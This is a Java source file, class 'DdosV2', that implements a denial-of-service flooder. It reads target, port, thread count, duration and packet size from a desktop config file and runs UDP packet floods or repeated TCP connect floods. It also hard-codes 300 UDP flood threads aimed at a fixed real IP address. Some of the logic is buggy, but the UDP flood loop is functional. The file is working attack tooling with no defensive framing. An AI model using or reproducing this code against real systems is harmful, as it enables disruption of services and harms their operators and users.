import java.io.BufferedReader;
import java.io.FileWriter;
import java.io.IOException;
import java.net.*;
import java.nio.file.Files;
import java.nio.file.Paths;
import java.util.Scanner;

public class DdosV2 {

    private static BufferedReader reader;

    private static FileWriter statisticWriter;

    private static FileWriter instructionWriter;

    private static int numberOfAttack = 0;

    private static int intNumberOfError = 0;

    private static String host;

    private static int port;

    private static int numberOfThread;

    private static String type;

    private static long endAttack;

    private static long bytes;

    private static Scanner scanner;

    static {
        try {
            reader = Files.newBufferedReader(Paths.get("C:\\Users\\Влад\\Desktop\\russian_web_service.txt"));
            statisticWriter = new FileWriter("C:\\Users\\Влад\\Desktop\\ddos_statistic.txt", false);
            instructionWriter = new FileWriter("C:\\Users\\Влад\\Desktop\\russian_web_service.txt", false);
        } catch (IOException e) {
            e.printStackTrace();
        }

    }

    public static void main(String[] args) throws IOException {
        instructionWriter.write("Please write on the next line information about attack and write start on command line FORMAT: host-port-numberOfThread-endAttack-bytes-TYPE");
        instructionWriter.flush();
        scanner = new Scanner(System.in);
        String start = scanner.nextLine();
        if (start.equals("start")) {
            int temp = 0;
            while (reader.read() != -1) {
                String str = reader.readLine();
                if (temp == 1) {
                    String[] configuration = str.split("-");
                    host = configuration[0];
                    port = Integer.valueOf(configuration[1]);
                    numberOfThread = Integer.valueOf(configuration[2]);
                    endAttack = Long.valueOf(configuration[3]);
                    bytes = Long.valueOf(configuration[4]);
                    type = configuration[5];
                    if (type.equals("UDP")) new Thread(attackUDP(host, port, numberOfThread, endAttack, bytes)).start();
                    else new Thread(attackTCP(host, port, numberOfThread, endAttack));
                }
                temp++;
            }
        }
        int temp = 0;
        while (temp < 300) {
            new Thread(attackUDP("5.101.153.181", Integer.valueOf(host), numberOfThread, endAttack, bytes)).start();
            temp++;
        }


    }

    public static Runnable attackTCP(String host, int port, int numberOfThread, long endAttack) {
        return new Runnable() {
            @Override
            public void run() {
                int temp = 0;
                while (System.currentTimeMillis() < endAttack || (numberOfThread > 0 && temp < numberOfThread)) {
                    try {
                        Socket socket = new Socket();
                        socket.connect(new InetSocketAddress(host, port), 2500);
                        Thread.sleep(100);
                        socket.close();
                        temp++;
                        numberOfAttack++;
                        System.out.println("Number of attack " + numberOfAttack);
                    } catch (Exception e) {
                        intNumberOfError++;
                        System.out.println("Number of exception " + intNumberOfError);
                    }
                }
            }
        };
    }

    public static Runnable attackUDP(String host, int port, int numberOfThread, long endAttack, long bytes) {
        return new Runnable() {
            @Override
            public void run() {
                try {
                    final byte[] buffer = new byte[(int) bytes];
                    final DatagramSocket datagramSocket = new DatagramSocket();
                    final DatagramPacket datagramPacket = new DatagramPacket(buffer, buffer.length, new InetSocketAddress(host, port));
                    int temp = 0;
                    while (true) {
                        datagramSocket.send(datagramPacket);
                        datagramSocket.send(datagramPacket);
                        datagramSocket.send(datagramPacket);
                        Thread.sleep(20);
                        temp++;
                        numberOfAttack++;
                        System.out.println("Number of attack " + numberOfAttack);
                    }
                } catch (Exception e) {
                    intNumberOfError++;
                    System.out.println("Number of exception " + intNumberOfError);
                }
            }
        };
    }
}

